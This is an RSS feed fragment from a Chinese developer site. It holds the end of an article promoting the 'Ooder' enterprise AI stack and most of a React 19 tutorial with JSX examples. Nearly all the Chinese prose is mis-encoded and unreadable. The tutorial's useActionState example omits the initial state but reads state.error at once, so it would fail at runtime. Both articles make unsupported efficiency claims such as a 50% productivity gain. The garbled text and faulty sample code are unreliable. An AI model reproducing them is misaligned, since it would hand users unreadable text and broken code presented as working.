<li><strong>å¯è§†åŒ–è®¾è®¡å™¨</strong>ï¼šæ”¯æŒå¼€å‘è€…é€šè¿‡â€œæ‹–æ‹½å¼â€æ“ä½œå¿«é€Ÿæ­å»ºç•Œé¢å¸ƒå±€ï¼ŒåŒæ—¶å…è®¸ AI æ·±åº¦å‚ä¸è®¾è®¡è¿‡ç¨‹ã€‚è®¾è®¡å™¨å¯è§£æ AI ç”Ÿæˆçš„äº¤äº’éœ€æ±‚ï¼Œè‡ªåŠ¨åŒ¹é…åˆé€‚çš„ UI ç»„ä»¶å¹¶å®Œæˆå¸ƒå±€ä¼˜åŒ–ï¼ŒéæŠ€æœ¯äººå‘˜ä¹Ÿå¯é€šè¿‡è‡ªç„¶è¯­è¨€æŒ‡ä»¤è®© AI ç”Ÿæˆç¬¦åˆä¸šåŠ¡éœ€æ±‚çš„ç•Œé¢åˆç¨¿ï¼Œå¤§å¹…é™ä½ç•Œé¢å¼€å‘é—¨æ§›ã€‚</li>
<li><strong>A2UI åè®®æ ¸å¿ƒæ”¯æ’‘</strong>ï¼šé‡‡ç”¨åŸºäº JSON æ ¼å¼çš„ A2UIï¼ˆæ™ºèƒ½ä½“è‡³ç”¨æˆ·ç•Œé¢ï¼‰å…¬å¼€åè®®ï¼Œå®ç° AI ä¸ç•Œé¢æ¸²æŸ“å¼•æ“çš„æ ‡å‡†åŒ–é€šä¿¡ã€‚AI å¯é€šè¿‡ A2UI åè®®ç›´æ¥è¾“å‡ºç•Œé¢æè¿°ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯æ¸²æŸ“å¼•æ“æ¥æ”¶åè‡ªåŠ¨è½¬æ¢ä¸º Reactã€Flutterã€SwiftUI ç­‰åŸç”Ÿæ¡†æ¶ä»£ç ï¼Œå®ç°â€œä¸€ä»½äº¤äº’æè¿°ã€å¤šç«¯åŸç”Ÿé€‚é…â€ã€‚è¯¥åè®®å…·å¤‡å®‰å…¨ä¼˜å…ˆã€LLM å‹å¥½ã€æ¡†æ¶æ— å…³çš„ä¼˜åŠ¿ï¼Œæ—¢ä¿éšœäº†ç•Œé¢ç”Ÿæˆçš„å®‰å…¨æ€§ï¼Œåˆæå‡äº† AI äº¤äº’è®¾è®¡çš„æ•ˆç‡ä¸çµæ´»æ€§ã€‚</li>
</ul>
<h4 data-id="heading-6">3. ç¯å¢ƒå¥—ç ï¼ˆOneCodeï¼‰â€”â€”å…¨æ ˆä¸€è‡´çš„æŠ€æœ¯æ”¯æ’‘æ¡†æ¶</h4>
<p>OneCode æ˜¯åŸºäºæ³¨è§£é©±åŠ¨çš„å…¨æ ˆæŠ€æœ¯æ¡†æ¶ï¼Œé€šè¿‡â€œä¸‰ç åˆä¸€æ··åˆç¼–è¯‘â€æ ¸å¿ƒæœºåˆ¶ï¼Œå®ç° AI ç”Ÿæˆæ•°æ®ã€ä¸šåŠ¡é€»è¾‘ã€ç•Œé¢ä»£ç çš„ä¸€è‡´æ€§ä¸å¯æ§æ€§ï¼Œä¸ºæ•´ä¸ªè§£å†³æ–¹æ¡ˆæä¾›ç¨³å®šã€é«˜æ•ˆçš„æŠ€æœ¯åº•åº§ã€‚</p>
<ul>
<li><strong>æ³¨è§£é©±åŠ¨å…¨æ ˆååŒ</strong>ï¼šé‡‡ç”¨è‡ªå®šä¹‰æ³¨è§£ä½“ç³»ï¼ˆå¦‚@DomainTreeã€@CrossEndAdaptï¼‰ï¼Œå°†é¢†åŸŸæ¨¡å‹ã€è·¨ç«¯é€‚é…è§„åˆ™ç­‰ä¿¡æ¯ä»¥ç»“æ„åŒ–æ³¨è§£å½¢å¼å†™å…¥ä»£ç ï¼Œå®ç°â€œä»£ç å³æ¨¡å‹ã€æ¨¡å‹å³ä»£ç â€çš„åŒå‘ç»‘å®šã€‚AI å¯è‡ªåŠ¨è¯†åˆ«ä¸šåŠ¡åœºæ™¯ç”Ÿæˆé€‚é…çš„ç»“æ„åŒ–æ³¨è§£ï¼Œå¹¶é€šè¿‡çŸ¥è¯†å›¾è°±æ ¡éªŒæ³¨è§£é—´çš„ä¾èµ–å…³ç³»ï¼Œé¿å…é…ç½®å†²çªï¼Œå¤§å¹…æå‡å…¨æ ˆå¼€å‘æ•ˆç‡ã€‚</li>
<li><strong>ä¸‰ç åˆä¸€æ··åˆç¼–è¯‘</strong>ï¼šæ•´åˆå‰ç«¯äº¤äº’ä»£ç ã€åç«¯ä¸šåŠ¡ä»£ç ã€æ•°æ®å¤„ç†ä»£ç â€œä¸‰ç â€ï¼Œé€šè¿‡æ··åˆç¼–è¯‘æŠ€æœ¯å®ç°ä»£ç çš„ç»Ÿä¸€æ ¡éªŒä¸ç”Ÿæˆã€‚AI ç”Ÿæˆçš„å„ç±»ä»£ç å°†é€šè¿‡ OneCode æ¡†æ¶è¿›è¡Œä¸€è‡´æ€§æ ¡éªŒï¼Œç¡®ä¿æ•°æ®æµè½¬ã€ä¸šåŠ¡é€»è¾‘ä¸ç•Œé¢äº¤äº’çš„ååŒä¸€è‡´ï¼›åŒæ—¶ï¼Œç¼–è¯‘è¿‡ç¨‹è‡ªåŠ¨é€‚é…å¤šç«¯è¿è¡Œç¯å¢ƒï¼Œå‡å°‘è·¨ç«¯å¼€å‘çš„é‡å¤å·¥ä½œï¼Œæå‡ä»£ç å¯ç»´æŠ¤æ€§ã€‚</li>
<li><strong>å…¨ç”Ÿå‘½å‘¨æœŸç®¡æ§</strong>ï¼šè¦†ç›–â€œéœ€æ±‚è§£æ-ä»£ç ç”Ÿæˆ-ç¼–è¯‘éƒ¨ç½²-è¿ç»´ç›‘æ§â€å…¨æµç¨‹ï¼ŒAI å¯é€šè¿‡æ³¨è§£é©±åŠ¨å®ç°ä»£ç çš„è‡ªåŠ¨æ›´æ–°ä¸è¿­ä»£ï¼ŒåŒæ—¶æ¡†æ¶å…·å¤‡å®Œå–„çš„ç‰ˆæœ¬ç®¡ç†ä¸å›æ»šæœºåˆ¶ï¼Œç¡®ä¿ AI æ•°æ®ä¸ä»£ç çš„ä¸€è‡´æ€§å¯æ§ï¼Œé™ä½ä¼ä¸šçº§åº”ç”¨çš„è¿ç»´æˆæœ¬ä¸é£é™©ã€‚</li>
<li>â€‹</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e40530005fb9439489e96d98ec6febd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768536622&amp;x-signature=qV6aADJOz%2BjnPAIa76JDYXTRDFw%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h2 data-id="heading-7">ä¸‰ã€æ ¸å¿ƒä¼˜åŠ¿ä¸ä»·å€¼é—­ç¯</h2>
<h3 data-id="heading-8">ï¼ˆä¸€ï¼‰æ ¸å¿ƒä¼˜åŠ¿</h3>
<ol>
<li><strong>èƒ½åŠ›å¯æ§æ€§</strong>ï¼šé€šè¿‡ SkillFlow çš„ Workflow è¾¹ç•Œæ§åˆ¶ä¸ MCP æ ‡å‡†åŒ–äº¤äº’ï¼Œå®ç° AI å¤–å»¶èƒ½åŠ›çš„ç²¾å‡†ç®¡æ§ï¼Œé¿å…èƒ½åŠ›æ»¥ç”¨ä¸è¶Šæƒæ“ä½œï¼Œæ»¡è¶³ä¼ä¸šçº§åˆè§„è¦æ±‚ã€‚</li>
<li><strong>å¼€å‘é«˜æ•ˆæ€§</strong>ï¼šA2UI ç”»å¸ƒçš„å¯è§†åŒ–è®¾è®¡ä¸ AI ç”Ÿæˆèƒ½åŠ›ã€OneCode çš„æ³¨è§£é©±åŠ¨ä¸ä¸‰ç åˆä¸€ç¼–è¯‘ï¼Œå¤§å¹…é™ä½å…¨æ ˆå¼€å‘é—¨æ§›ï¼Œç¼©çŸ­åº”ç”¨è¿­ä»£å‘¨æœŸï¼ŒæŸé‡‘èå®¢æˆ·å®æµ‹å¤æ‚æ¨¡å—å¼€å‘å‘¨æœŸä» 3 ä¸ªæœˆå‹ç¼©è‡³ 2 å‘¨ã€‚</li>
<li><strong>äº¤äº’é€‚é…æ€§</strong>ï¼šA2UI åè®®çš„æ¡†æ¶æ— å…³ç‰¹æ€§å®ç°å¤šç«¯åŸç”Ÿé€‚é…ï¼Œä¿éšœä¼ä¸šå“ç‰Œä½“éªŒçš„ä¸€è‡´æ€§ï¼ŒåŒæ—¶ AI å¯æ ¹æ®ç”¨æˆ·è§’è‰²è‡ªåŠ¨ä¼˜åŒ–äº¤äº’ç•Œé¢ï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚</li>
<li><strong>æ•°æ®ä¸€è‡´æ€§</strong>ï¼šOneCode çš„æ³¨è§£é©±åŠ¨ä¸æ··åˆç¼–è¯‘æœºåˆ¶ï¼Œç¡®ä¿ AI ç”Ÿæˆçš„æ•°æ®æµã€ä¸šåŠ¡æµä¸ä»£ç æµé«˜åº¦ä¸€è‡´ï¼Œé™ä½æ•°æ®å†—ä½™ä¸é€»è¾‘å†²çªé£é™©ï¼Œç³»ç»Ÿ BUG ç‡å¯ä¸‹é™ 47%ä»¥ä¸Šã€‚</li>
</ol>
<h3 data-id="heading-9">ï¼ˆäºŒï¼‰ä»·å€¼é—­ç¯</h3>
<p>Ooder ä¼ä¸šçº§ AI è§£å†³æ–¹æ¡ˆé€šè¿‡â€œAI å¤§è„‘ç»Ÿç­¹è°ƒåº¦- SkillFlow ç®¡æ§æµç¨‹- A2UI ç”Ÿæˆäº¤äº’- OneCode æ”¯æ’‘è½åœ°â€çš„å…¨é“¾è·¯ååŒï¼Œå½¢æˆâ€œéœ€æ±‚è¾“å…¥-æ™ºèƒ½æ‰§è¡Œ-ç»“æœè¾“å‡º-è¿­ä»£ä¼˜åŒ–â€çš„ä»·å€¼é—­ç¯ã€‚è¯¥æ–¹æ¡ˆæ— éœ€ä¼ä¸šæ¨å€’åŸæœ‰ç³»ç»Ÿï¼Œå¯ä¸ç°æœ‰ä¸šåŠ¡èµ„äº§æ— ç¼å…¼å®¹ï¼Œæ—¢èƒ½è®© AI æ‰¿æ¥é‡å¤åŠ³åŠ¨ã€æå‡å¼€å‘ä¸ä¸šåŠ¡æ•ˆç‡ï¼Œåˆèƒ½é€šè¿‡æ ‡å‡†åŒ–ä¸å¯æ§åŒ–è®¾è®¡ä¿éšœç³»ç»Ÿå®‰å…¨ä¸åˆè§„ï¼Œæœ€ç»ˆå¸®åŠ©ä¼ä¸šå®ç°â€œAI èµ‹èƒ½ä¸šåŠ¡ã€æŠ€æœ¯é©±åŠ¨å¢é•¿â€çš„æ ¸å¿ƒç›®æ ‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 19 å®æˆ˜ï¼š5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%ï¼]]></title>    <link>https://juejin.cn/post/7592846242176958498</link>    <guid>https://juejin.cn/post/7592846242176958498</guid>    <pubDate>2026-01-09T04:17:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592846242176958498" data-draft-id="7592912361302065187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 19 å®æˆ˜ï¼š5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%ï¼"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-09T04:17:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 19 å®æˆ˜ï¼š5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:17:14.000Z" title="Fri Jan 09 2026 04:17:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>React 19 å®æˆ˜ï¼š5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%ï¼</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>React ä½œä¸ºç°ä»£å‰ç«¯å¼€å‘çš„æ ‡æ†æ¡†æ¶ï¼Œæ¯ä¸€æ¬¡é‡å¤§ç‰ˆæœ¬æ›´æ–°éƒ½ä¼šå¸¦æ¥é¢ è¦†æ€§çš„æ”¹è¿›ã€‚React 19 ä¹Ÿä¸ä¾‹å¤–ï¼Œå®ƒåœ¨æ€§èƒ½ä¼˜åŒ–ã€å¼€å‘è€…ä½“éªŒå’ŒåŠŸèƒ½æ‰©å±•æ–¹é¢å¸¦æ¥äº†å¤šé¡¹ä»¤äººæŒ¯å¥‹çš„æ–°ç‰¹æ€§ã€‚æœ¬æ–‡å°†æ·±å…¥å‰–æ React 19 ä¸­æœ€å€¼å¾—å…³æ³¨çš„ 5 ä¸ªæ–°ç‰¹æ€§ï¼Œå¹¶é€šè¿‡å®æˆ˜æ¡ˆä¾‹å±•ç¤ºå¦‚ä½•åˆ©ç”¨å®ƒä»¬å°†å¼€å‘æ•ˆç‡æå‡è‡³å°‘ 50%ã€‚æ— è®ºä½ æ˜¯ React æ–°æ‰‹è¿˜æ˜¯èµ„æ·±å¼€å‘è€…ï¼Œè¿™äº›æ–°ç‰¹æ€§éƒ½å°†æ˜¾è‘—æ”¹å˜ä½ çš„å¼€å‘æ–¹å¼ã€‚</p>
<hr/>
<h2 data-id="heading-2">React Server Componentsï¼ˆRSCï¼‰çš„æ­£å¼æ”¯æŒ</h2>
<h3 data-id="heading-3"><strong>èƒŒæ™¯ä¸ç—›ç‚¹</strong></h3>
<p>ä¼ ç»Ÿçš„ React åº”ç”¨é€šå¸¸åœ¨å®¢æˆ·ç«¯æ¸²æŸ“ï¼ˆCSRï¼‰ï¼Œè¿™ä¼šå¯¼è‡´é¦–å±åŠ è½½æ—¶é—´è¾ƒé•¿ï¼ŒSEO ä¸å‹å¥½ç­‰é—®é¢˜ã€‚è™½ç„¶ Next.js ç­‰æ¡†æ¶æä¾›äº†æœåŠ¡ç«¯æ¸²æŸ“ï¼ˆSSRï¼‰æ–¹æ¡ˆï¼Œä½†é…ç½®å¤æ‚ä¸”çµæ´»æ€§ä¸è¶³ã€‚</p>
<h3 data-id="heading-4"><strong>React Server Componentsï¼ˆRSCï¼‰çš„è§£å†³æ–¹æ¡ˆ</strong></h3>
<p>React 19 æ­£å¼å°† RSC çº³å…¥æ ¸å¿ƒåŠŸèƒ½ï¼Œå…è®¸å¼€å‘è€…åœ¨æœåŠ¡ç«¯ç›´æ¥æ¸²æŸ“ç»„ä»¶ï¼Œæ— éœ€å‘é€å¤šä½™çš„ JavaScript åˆ°å®¢æˆ·ç«¯ã€‚è¿™ä¸ä»…å‡å°‘äº† bundle sizeï¼Œè¿˜èƒ½æ˜¾è‘—æå‡é¦–å±åŠ è½½é€Ÿåº¦ã€‚</p>
<h3 data-id="heading-5"><strong>å®æˆ˜ç¤ºä¾‹</strong></h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// ServerComponent.server.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ServerComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç›´æ¥ä»æ•°æ®åº“è·å–æ•°æ®</span>
  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">fetchDataFromDB</span>();
  
<span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{data.title}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{data.content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
}
</code></pre>
<p>åœ¨å®¢æˆ·ç«¯å¯ä»¥ç›´æ¥å¼•ç”¨ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// ClientComponent.client.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ServerComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ServerComponent.server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ClientComponent</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ServerComponent</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
}
</code></pre>
<h3 data-id="heading-6"><strong>æ•ˆç‡æå‡ç‚¹</strong></h3>
<ul>
<li><strong>å‡å°‘å®¢æˆ·ç«¯è´Ÿæ‹…</strong>ï¼šé€»è¾‘å’Œæ•°æ®è·å–ç›´æ¥åœ¨æœåŠ¡ç«¯å®Œæˆã€‚</li>
<li><strong>æ›´å¿«çš„ TTIï¼ˆTime to Interactiveï¼‰</strong>ï¼šç”¨æˆ·æ— éœ€ç­‰å¾… JavaScript hydrateã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-7">Actions APIï¼šç®€åŒ–è¡¨å•å’Œæ•°æ®æäº¤</h2>
<h3 data-id="heading-8"><strong>èƒŒæ™¯ä¸ç—›ç‚¹</strong></h3>
<p>ä¼ ç»Ÿè¡¨å•å¤„ç†é€šå¸¸éœ€è¦æ‰‹åŠ¨ç®¡ç†çŠ¶æ€ã€é”™è¯¯å¤„ç†å’Œæäº¤é€»è¾‘ï¼Œä»£ç å†—ä½™ä¸”å®¹æ˜“å‡ºé”™ã€‚å³ä½¿ä½¿ç”¨ Formik æˆ– React Hook Formï¼Œä»éœ€é¢å¤–ä¾èµ–åº“ã€‚</p>
<h3 data-id="heading-9"><strong>Actions APIçš„æ”¹è¿›</strong></h3>
<p>React 19å¼•å…¥äº†<code>useActionState</code>å’Œ<code>useFormStatus</code>ç­‰æ–°Hookï¼ŒåŸç”Ÿæ”¯æŒè¡¨å•æäº¤çš„çŠ¶æ€ç®¡ç†ã€pendingçŠ¶æ€å’Œé”™è¯¯å¤„ç†ã€‚</p>
<h3 data-id="heading-10"><strong>å®æˆ˜ç¤ºä¾‹</strong></h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useActionState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">submitForm</span>(<span class="hljs-params">prevState, formData</span>) {
<span class="hljs-keyword">const</span> email = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">'email'</span>);
<span class="hljs-keyword">if</span> (!email.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@'</span>)) {
<span class="hljs-keyword">return</span> { <span class="hljs-attr">error</span>: <span class="hljs-string">'Invalid email'</span> };
}
<span class="hljs-comment">// Submit to server</span>
<span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> };
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">SignupForm</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">const</span> [state, submitAction] = <span class="hljs-title function_">useActionState</span>(submitForm);

<span class="hljs-keyword">return</span> (
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{submitAction}</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"email"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
{state.error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{state.error}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
);
}
</code></pre>
<h3 data-id="heading-11"><strong>æ•ˆç‡æå‡ç‚¹</strong></h3>
<ul>
<li><strong>å‡å°‘æ ·æ¿ä»£ç </strong>ï¼šæ— éœ€æ‰‹åŠ¨ç®¡ç†loadingæˆ–errorçŠ¶æ€ã€‚</li>
<li><strong>å†…ç½®ä¹è§‚æ›´æ–°æ”¯æŒ</strong>ï¼šæœªæ¥ç‰ˆæœ¬å¯èƒ½ç›´æ¥é›†æˆä¹è§‚UIæ›´æ–°ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-12">Document Metadataçš„ç»„ä»¶åŒ–æ”¯æŒ</h2>
<h3 data-id="heading-13"><strong>èƒŒæ™¯ä¸ç—›ç‚¹</strong></h3>
<p>åŠ¨æ€ä¿®æ”¹<code>&lt;title&gt;</code>æˆ–<code>&lt;meta&gt;</code>æ ‡ç­¾é€šå¸¸éœ€è¦ä¾èµ–<code>react-helmet</code>æˆ–æ‰‹åŠ¨æ“ä½œDOMï¼Œä»£ç åˆ†æ•£ä¸”éš¾ä»¥ç»´æŠ¤ã€‚</p>
<h3 data-id="heading-14"><strong>æ–°ç‰¹æ€§æ”¹è¿›</strong></h3>
<p>React19å…è®¸åœ¨ç»„ä»¶æ ‘ä¸­ç›´æ¥å®šä¹‰æ–‡æ¡£å…ƒæ•°æ®ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">HomePage</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">return</span> (
<span class="xml"><span class="hljs-tag">&lt;&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Home | My App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"description"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"Welcome to my app"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home Page<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/&gt;</span></span>
);
}
</code></pre>
<h3 data-id="heading-15"><strong>æ•ˆç‡æå‡ç‚¹</strong></h3>
<ul>
<li><strong>æ›´å¥½çš„å¯ç»´æŠ¤æ€§</strong>ï¼šå…ƒæ•°æ®ä¸ç»„ä»¶é€»è¾‘å…±å­˜ã€‚</li>
<li><strong>SSRå‹å¥½</strong>ï¼šè‡ªåŠ¨å¤„ç†æœåŠ¡ç«¯æ¸²æŸ“æ—¶çš„æ ‡ç­¾æ³¨å…¥ã€‚</li>
</ul>
<hr/>
